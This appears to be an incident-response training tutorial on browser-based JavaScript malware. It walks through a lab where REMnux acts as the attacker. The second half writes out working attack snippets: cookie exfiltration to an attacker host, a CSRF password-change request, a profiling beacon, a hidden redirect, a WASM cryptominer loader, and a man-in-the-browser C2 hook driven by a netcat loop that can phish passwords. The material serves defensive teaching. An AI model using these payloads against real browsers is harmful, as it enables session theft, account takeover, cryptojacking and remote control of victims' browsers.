# JavaScript and Browser-Based Malware

JavaScript is the primary scripting language used on the world wide web.  When you visit a website, your browser downloads and executes any JavaScript code called by the web page in the background and without any user interaction.  Web designers use this functionality to enhance a user's browsing experience while malware authors use it to execute untrusted code.





Each browser has their own JavaScript engine and provides a sandboxed execution environment for every HTML document displayed.  The sandbox limits the JavaScript to specific, predefined methods and properties within the browser.  This ensures a script from a random site can't delete your hard drive in the same way that running an executable from a random site can. 

But even within a sandbox, browser-based malware can be used to steal sensitive information, probe for vulnerabilities, and launch exploits and social engineering attacks.  For this reason, it is important to understand basic browser operation and the flow of execution when a browser loads a web page containing malicious JavaScript.


This document will review:

- [Basic Browser Operation](#basic-browser-operation)
	- [HTML Documents](#html-documents)
	- [External Content](#external-content)
		- [Links](#links)
		- [IFrames](#iframes)
		- [Images](#images)
		- [Stylesheets](#stylesheets)
		- [Scripts](#scripts)
		- [Web Workers](#web-workers)
		- [Plug-ins](#plug-ins)
	- [Document Object Model](#document-object-model)
	- [AJAX Requests](#ajax-requests)
		- [XMLHttpRequest](#xmlhttprequest)
		- [Fetch](#fetch)
- [Malicious Use of JavaScript](#malicious-use-of-javascript)
	- [Session Hijacking](#session-hijacking)
	- [Cross-Site Request Forgery](#cross-site-request-forgery)
	- [Profiling and Probing](#profiling-and-probing)
	- [Redirecting the Browser](#redirecting-the-browser)
	- [Cryptocurrency Mining](#cryptocurrency-mining)
	- [Man in the Browser](#man-in-the-browser)

<br>
Files used in the sample website are located on the OOB at:

	/CSIRT/Sample-Files/html

To start the website:

- Put the entire `html` directory on your Windows VM Desktop
- Open PowerShell prompt from the Desktop and type `python -m http.server`
- Open Chrome and navigate to `localhost:8000/html/dynamic-page.html`


## Basic Browser Operation

A browser is used to receive and execute instructions from arbitrary servers on the Internet over IP.  The most common way to deliver these instructions is by using an HTML document. As the browser parses an HTML document and begins loading its content, it builds a representation of the web page in memory called the DOM that can be updated and changed.  AJAX requests are then used to load additional content in the background without having to refresh the page. 

- [HTML Documents](#html-documents)
- [External Content](#external-content)
- [Document Object Model](#document-object-model)
- [AJAX Requests](#ajax-requests)


### HTML Documents

HyperText Markup Language (HTML) is the primary language used for displaying web pages.  An HTML document is a hierarchical structure of elements making up the contents of the web page.  These elements are defined using tags which specify an element's attributes.

|Tag|Element|
|-|-|
|`<html>`|The HTML document|
|`<head>`|Container for metadata|
|`<title>`|Title of the document|
|`<h1>` to `<h6>`|Headings|
|`<a>`|Links are used to navigate from page to page|
|`<img>`|Images displayed on page|
|`<p>`|Paragraphs contain text to be displayed|
|`<style>`, `<link>`|Cascading Style Sheets (CSS) control the appearance of the HTML document|
|`<iframe>`|IFrames display a web page within a web page|
|`<script>`|JavaScript is used for dynamic and interactive content|	
|`<form>`|Forms are used to collect user input|

<br>

A browser requests a web page using a GET request, parses the HTML code in the file it recieves, and begins to render all the data it contains.

This data can be:
	
- Text to read
- Images to view
- Links that can be clicked
- Documents that will be loaded (HTML, CSS)
- Scripts that will run (JavaScript, VBScript)
- Files that need to be run by a browser plug-in (Flash, Silverlight, Java)




### External Content

Here are some common ways to link and embed external content in a web page:

- [Links](#links)
- [IFrames](#iframes)
- [Images](#images)
- [Stylesheets](#stylesheets)
- [Scripts](#scripts)
- [Web Workers](#web-workers)
- [Plug-ins](#plug-ins)

Open the web page at `localhost:8000/html/dynamic-page.html`.

With the page loaded, open Chrome's DevTools by pressing `F12` and then click on the **Sources** tab.

The cloud icons represent the sources of all the content the page currently has loaded.

The window icons represent web pages---top is the current page while example.com is an embedded page.

![](images/JavaScript%20and%20Browser-based%20Malware/image000.png)<br><br>

You can expand each one to see the specific content that came from each source.

Let's look at some of the external content on the page, one at a time:


#### Links

The most basic way to reference external content is using a link:

```html
<a href="https://www.timeanddate.com">Click here for current time and date</a>
```

Clicking on the link would force you to leave this page and load a new HTML document hosted on the timeanddate.com site.

Let's stay on this page for now.


#### IFrames

IFrames are used to embed documents into the current page.  They can be hidden by setting height and width to "0" or can load the current page into an overlay while code continues to run in the background:

```html
<iframe src="http://example.com" height="80" width="210"></iframe>
```

In DevTools, click on the **Network** tab to see where the page was downloaded from example.com and rendered in a small window on the page.


#### Images

Images can be displayed with the `img` tag:

```html
<img src="http://i0.kym-cdn.com/entries/icons/original/000/011/365/GRUMPYCAT.jpg" height="120" width="210"></img>
```

You can also see where this image was downloaded from a remote host and resized to display on the page.


#### Stylesheets

CSS files are used to format colors, fonts, and styling:

```html
<link rel="stylesheet" href="style.css">
```

The download of the stylesheet `style.css` can also be seen in the **Network** tab.

Highlight the file under the **Name** column.  The **Headers** tab will show the HTTP request that was sent to retrieve it and the **Response** tab will show you what was returned---the contents of the file.


#### Scripts

There are a number of ways to execute scripts in the browser.

Inline script blocks:

```html
<script>alert("hello");</script>
```

Remote scripts:

```html
<script type="text/javascript" src="hello.js"></script>
```

Using HTML parameters:

```html
<a href="javascript:alert('hello')";>Click me</a>
```

Using event handlers such as `onclick`, `onerror`, `onload`, etc:

```html
<body onload="alert(`hello`);">
```

Using timers such as `setTimeout` and `setInterval`:

```javascript
setInterval(function hook(){d=document;z=d.createElement("script");z.src="//remnux";d.body.appendChild(z);},5000);
```

Using `eval` calls:

```javascript
eval('alert("hello");')
```


In DevTools, watch the **Network** tab as you click the **Run Script** button.  You will see the `hello.js` file get loaded from over the network and start running in the browser.  After you select **OK** or **Cancel**, highlight the file and click on the **Response** tab to see the code the file contained.


#### Web Workers

Web workers are objects that run a javascript file in its own thread that has a different context than the current window.  This is mainly used for performing processor-intensive calculations without interfering with the user interface thread:

```html
<script>var worker = new Worker("count.js");</script>
```

In DevTools, watch the **Sources** tab as you start the Web Worker.  Notice that it runs in its own thread separate from the web page.

You can expand the thread out and see the file that's running and its contents:

![](images/JavaScript%20and%20Browser-based%20Malware/image010.png)<br><br>


#### Plug-ins

Browser plug-ins such as Adobe Reader allow different file formats to be displayed in the browser:

|Plug-in|Description|
|-|-|
|Microsoft Office|embedded word documents and spreadsheets|
|Microsoft Silverlight|embedded videos|
|Windows Media Player|embedded audio and video|
|ActiveX Controls|plug-ins for Internet Explorer|
|Apple QuickTime|embedded audio and video|
|Adobe Reader|embedded PDFs|
|Adobe Flash|embedded videos|
|Java|java programs called applets|

<br>

Plug-ins either run content embedded into a page or they run a specific MIME type in place of the page (such as a page that serves a PDF like [this one](https://zeltser.com/media/docs/malware-analysis-cheat-sheet.pdf)). 

If you look at the source code of that page, you can see it is a PDF file, not an HTML document.  In this case, the browser will use the Adobe Reader plug-in to parse and render the content.

![](images/JavaScript%20and%20Browser-based%20Malware/image009.png)<br><br>


Here is a Flash program that is embedded into a web page:

```html
<object data="https://www.w3schools.com/html/bookmark.swf" type="application/x-shockwave-flash">
```

In the **Network** tab you can see where the `bookmark.swf` file was downloaded to run inside the page.

If it's not running, click on the Flash file to run it.
                          
<br>
As the browser parses the HTML document, retrieving and loading all this content into memory, it builds a structured representation of the web page called the Document Object Model (DOM).

### Document Object Model

The DOM is a virtual map of the web page that is currently loaded in the browser. This in-memory representation of all HTML elements of the web page is used to display and update the page.  By representing all HTML elements as objects, scripts running in the browser can read and modify the rendered document dynamically.

![](images/JavaScript%20and%20Browser-based%20Malware/image001.jpg)


The DOM is accessed using a hierarchy of objects provided by the JavaScript execution environment. In this environment, scripts can share functions and global variables and interact with the browser in various ways:

|Object Name|Description|
|-|-|
|document|used to access the DOM of the current page|
|location|used to access the URL of the current page|
|history|used to navigate through browsing history|
|navigator|used to query browser version information|
|screen|used to query screen dimensions, browser window, colors, and display info|

<br>

JavaScript accesses the DOM using the `document` object.  For instance, the `document.scripts` object contains all scripts on the page. 

We can access these using the DOM by opening Chrome DevTools with `F12`, going to the **Console** tab, and typing `document.scripts`:

![](images/JavaScript%20and%20Browser-based%20Malware/image002.PNG)<br><br>

To access a specific object, we can call it using the order in which it's displayed on the page.  Typing `documents.scripts[3]` will reference the **4th** script on the page. (First object is "0", second is "1", etc.):

![](images/JavaScript%20and%20Browser-based%20Malware/image003.png)<br><br>


Another example:

When you first loaded the page, a script on the page assigned you a cookie to act as your Session ID.  This object can be accessed by typing `document.cookie` in the console:

![](images/JavaScript%20and%20Browser-based%20Malware/image004.png)<br><br>

Now refresh the page and when the code runs again, it detects the cookie and uses it to welcome you back to the site:

![](images/JavaScript%20and%20Browser-based%20Malware/image005.png)<br><br>

We can also use DevTools to call functions on the page.

To delete the cookie, we can call the `deleteCookie` function by typing `deleteCookie("SessId")`.

Now verify the cookie has been deleted by typing `document.cookie`.

Scripts use objects to manipulate the DOM.  Because of script isolation rules in the JavaScript execution environment, if scripts need to interact with something outside this context, they must use one of the APIs provided by the browser.  Two of the most popular are [XMLHttpRequest](#xmlhttprequest) and [Fetch](#fetch) which are Web APIs used to make Asynchronous JavaScript and XML (AJAX) requests.


### AJAX Requests

Using AJAX requests, parts of a web page can be updated without interrupting the user's browsing session.  Browser APIs such as XMLHttpRequest and Fetch allow a client to load additional content such as JSON, XML, HTML, and txt files, from the Web asynchronously.  

While AJAX helps JavaScript create dynamic web applications by loading content in the background without reloading the page, this same technology is frequently used to hide malicious JavaScript functions from the user.

- [XMLHttpRequest](#xmlhttprequest)
- [Fetch](#fetch)


#### XMLHttpRequest

XMLHttpRequest (XHR) objects can be created and used to load remote content in the background.  The following code downloads a file named `xhr.txt` and prints its contents to the console:

```html
<script>
function xhrFile() {
	var x=new XMLHttpRequest();
	x.open('GET','files/xhr.txt');
	x.send();
	x.onreadystatechange=function(){if(this.readyState==4){console.log(x.responseText)}};
}
</script>
```

In DevTools, watch the **Network** tab as you click the **Use XHR** button.  You will see the request that downloads the `xhr.txt` file requested and the contents displayed in the console:

![](images/JavaScript%20and%20Browser-based%20Malware/image006.png)<br><br>

   
#### Fetch

The Fetch API is a modern replacement for XMLHttpRequest.  This code downloads a file named `fetch.txt` and prints its contents to the console:

```html
<script>fetch('files/fetch.txt').then(function(r){r.text().then(function(w){console.log(w)})});</script>
```

Watch the **Network** tab as you click the **Use Fetch** button.  You will see the `fetch.txt` file requested and the contents displayed in the console:

![](images/JavaScript%20and%20Browser-based%20Malware/image007.png)<br><br>

                       

Each one of these, or different combinations of these, can be used to cause a browser to perform unwanted actions. 

Here are some common ways malware uses JavaScript to run untrusted code in a browser.


## Malicious Use of JavaScript

Browser-based malware must first find a way to execute code in the browser.  This code can be HTML, CSS, JavaScript, or even a bytecode file run by a browser plug-in.  In this document we'll focus on those that can be accomplished using JavaScript.

Simulate the following six examples while watching with DevTools:

|Use|Example|
|-|-|
|[Session Hijacking](#session-hijacking)|A vulnerability on a legitimate site is exploited to capture avisitor's session token|
|[Cross-Site Request Forgery](#cross-site-request-forgery)|A vulnerability is exploited to induce an unwanted action using the visitor's session token|
|[Profiling and Probing](#profiling-and-probing)|An attacker-owned landing page that uses JS to enumerate the browser, host, and network|
|[Redirecting the Browser](#redirecting-the-browser)|Compromised sites are injected with JS code that forces a request to a landing page|
|[Cryptocurrency Mining](#cryptocurrency-mining)|Legitimate and untrusted sites use JS to run a cryptominer in the background until the page closes|
|[Man in the Browser](#man-in-the-browser)|JS code is used to control, or "hook" a browser, executing arbitrary JS code using a C2 channel|  

<br>

To demonstrate these, start up REMnux to act as the attacker-owned system.  

Since Google Chrome restricts certain functionality to destination port 80, we'll need to open up port 80 which requires root permissions.

To listen for connections on port 80:

```bash
sudo -i 
nc -lp 80
```

The system should now be listening for connections on port 80.


### Session Hijacking

Many web applications use cookies or session tokens to identify users and their authenticated sessions.  By stealing a user's session cookie and copying it to their browser, an attacker can use the site while impersonating the victim and take over the account.  Common scenarios include the compromise of webmail accounts, online banking services, and company website administrator accounts.

The following code will make the browser send the user's session token for that website to an attacker-owned URL which can then be used to hijack the session and take over the account:

```javascript
new Image()).src = "//remnux/grabsessid.php?" + document.cookie;
```


In DevTools, watch the Network tab and click the `Session Hijack` button.  You can see that the cookie is sent in the URL of the request:

![](images/JavaScript%20and%20Browser-based%20Malware/image0088.png)
![](images/JavaScript%20and%20Browser-based%20Malware/image008.png)<br><br>


Hit `Ctrl + C` on the REMnux host to break the connection.

Open up port 80 again with `nc -lp 80`


### Cross-Site Request Forgery

Another scenario is JavaScript code that forces the victim browser to execute an unwanted action on a web application.  Once authenticated to the target site, a browser can be made to send an HTTP request performing a state-changing transaction, such as a password change or a purchase, which will contain the user's session token.  Since the request performing the change contains the user's session token, it will look similar to all the other legitimate requests the user has made during his authenticated session.  The target site has no way of knowing the request actually came from the attacker.

The following code will force a browser to make a state changing transaction using an HTTP request in the context of the user's authenticated session:

```javascript
fetch('//remnux/change_password.php', {method: 'post', body: document.cookie+"&new_password=thisWILLneverBEguessed22" }).then(function(r){r.text().then(function(w){console.log(w)})});
```

You should see that the REMnux console received a POST request including the two pieces of data required to make a password change---the session ID and the new password provided by the attacker. 

![](images/JavaScript%20and%20Browser-based%20Malware/image014.png)<br><br>

On REMnux, hit `Ctrl + C` and then `nc -lp 80` again.

### Profiling and Probing

This technique is used by Exploit Kit landing pages to identify the user's browser, plug-ins, and environment while searching for potential vulnerabilities.  Responses from the victim's browser help determine the application or plug-in most likely to result in exploitation.  These specific exploit modules are then loaded to exploit the user's specific configuration. 

These scripts are usually heavily obfuscated and perform many different checks but here's a simple example of how JavaScript can be used to identify the browser and plugin versions: 

```javascript
var p = navigator.platform;
if (window.chrome){var c = true;}
if (navigator.plugins.named = "Shockwave Flash"){var s = true;}
var v = (navigator.plugins['Shockwave Flash'].description).split(' ')[2];
(new Image()).src = "//remnux/details.php?chrome=" + c + "?platform=" + p + "?shockwave=" + s + "?version=" + v;
```

As you click the **Profile and Probe** button, you should see an HTTP request in the REMnux console reporting the results of the code:

![](images/JavaScript%20and%20Browser-based%20Malware/image011.png)<br><br>

On REMnux, hit `Ctrl + C` and then `nc -lp 80` again.

### Redirecting the Browser

Drive-by Downloads and Watering Hole attacks (a more targeted version of a Drive-by Download) frequently use this technique to redirect visitors to an attacker-owned landing page which can profile the victim's system and/or deliver an exploit or malware.  When this page is opened in a new window, JavaScript can be used to change the dimensions and location of the window to partially or completely hide it from the user.  

The following code forces the browser to visit a page while attempting to hide it from the user:

```javascript
window.open(url, 's', 'width=5, height=2, left='+screen.width+', top='+screen.height+', resizable=yes, toolbar=no, location=no, directories=no, status=no, menubar=no, scrollbars=yes, resizable=no, copyhistory=no');
```

Click on the **Redirect Browser** button and watch as the `landing_page.html` is requested from the REMnux host:

![](images/JavaScript%20and%20Browser-based%20Malware/image012.png)<br><br>

Notice that the landing page was loaded but only slightly visible in the lower right-hand corner of the screen:

![](images/JavaScript%20and%20Browser-based%20Malware/image013.png)<br><br>

On REMnux, hit `Ctrl + C` and then `nc -lp 80` again.

### Cryptocurrency Mining

Cryptominers, or programs that use a machine's CPU to mine cryptocurrency, are increasingly being delivered by both legitimate and untrusted sites as a way to make money.  Many crypto miners that do not ask permission to run are being labeled as malware since they are in essence stealing the user's computer resources.  There are many types of cryptocurrency, one we've been seeing lately is Monero which is mined by sites such as Coinhive.

The majority of the cryptominers you will see will be in the form of a Web Assembly (WASM) file which is optimized code that can run significantly faster than JavaScript.

#### Web Assembly

Web Assembly (WASM) can be compared to writing and compiling code to run on an Operating System.  For example, C programs can be compiled for either Windows, Linux, or Mac and for the x64 or x86 architecture.  The compiler scans the entire program and creates an optimized executable containing binary code for the CPU to execute.  After this, the executable should run on any machine with the appropriate OS and architecture.

Web Assembly is similar as it allows you to compile a C program into WASM that will run on any of the major browsers---Safari, Chrome, Firefox, and Edge.  By writing programs in C/C++ and compiling them to WASM, developers can control exactly how memory is allocated and freed making programs much, much faster.  This results in a huge performance boost because the browser is being given code that's already been optimized.  It's basically running native code on the browser.

In other words, WASM is machine code for a *conceptual* machine, not a physical machine since on the web the architecture of the client machine is unknown.  Web assembly doesn't replace JavaScript, but complements it by enabling hybrid designs (WASM + JS).  JavaScript loads a web assembly module, instantiates it, and calls its functions.

The following code downloads a miner written in web assembly and runs it using a Web Worker:

```javascript
function loadMiner() {
	d=document;m=d.createElement("script");m.src="https://nfwebminer.com/lib/miner.js";d.body.appendChild(m);
}
function callMiner() {
	var miner = new NFMiner("187fd", {load:"medium"});
	miner.start();
}
```

Go to the **Sources** tab in DevTools and click the **WASM Miner** button.  You should see a new source file appear from the nfwebminer\[d\]com domain and then a few seconds later a web worker should start:

![](images/JavaScript%20and%20Browser-based%20Malware/image015.png)<br><br>

Check the Task Manager and verify that Google Chrome is at around 70-100% CPU:

![](images/JavaScript%20and%20Browser-based%20Malware/image016.png)<br><br>

Once you leave or refresh the page, the code stops running.


### Man in the Browser

A Man in the Browser (MitB) attack is when injected JavaScript establishes a communication channel and obtains persistence in the browser.  This allows an attacker to eavesdrop on browser operations, hijack GET and POST requests, and relay traffic intended for a legitimate server back to the attacker where requests and responses can be modified.  Additionally, the attacker can read and modify content within the current page without victim intervention while hidden from the user and the server. 

The following code hooks the browser by making a request every 5 seconds and executing any JavaScript commands it receives:

```javascript
setInterval(function hook(){d=document;z=d.createElement("script");z.src="//remnux";d.body.appendChild(z);},5000);
```

To configure REMnux to receive the JavaScript shell, type the following:

```bash
while :;do printf "$ ";read c;echo $c | nc -lp 80 > /dev/null;done
```

With REMux now listening on port 80, switch to the **Network** tab in DevTools and click the **Hook Browser** button.

You should see the browser making some failed requests to the remnux host.  

![](images/JavaScript%20and%20Browser-based%20Malware/image017.png)<br><br>

This is because it is not getting a response (a command) from the C2 server.

Now type some JavaScript code into the REMnux command prompt such as:

```javascript
alert(1)
```

When the script retrieves the command, you should see the alert window pop up on the screen:

![](images/JavaScript%20and%20Browser-based%20Malware/image018.png)<br><br>

Now any JavaScript code you enter will be executed in the victim browser.


Try launching a social engineering attack by typing the following code in the REMnux console:

```javascript
var secret = prompt("Please enter your password: ")
```

The user is prompted for their password:

![](images/JavaScript%20and%20Browser-based%20Malware/image019.png)<br><br>

When entered, the password is available via the DOM in the variable `secret`:

![](images/JavaScript%20and%20Browser-based%20Malware/image020.png)<br><br>

With the ability to manipulate the DOM, the attacker has a number of options:

- Create fake buttons and error messages
- Manipulate content such as videos, links, and text
- Steal clipboard data, sniff keystrokes and events
- Enumerate browser details, plugins, and the network
- Deliver exploits and payloads

## Summary

Modern browsers contain many different features that are designed to enhance user experience including embedded content, dynamic scripting, and AJAX calls.  All of these features increase the attack surface of browsers as they can potentially be used to run untrusted code or social engineer the user into performing unwanted actions.

Being able to examine the structure and purpose of a malicious webpage is essential for accurate analysis and reporting.  Become familiar with some of the ways JavaScript can be used to hijack an account, induce an action, or run code that's hidden from the user.  Chrome's DevTools is a great way to do this and FireFox and IE also have debuggers with similar capabilities.
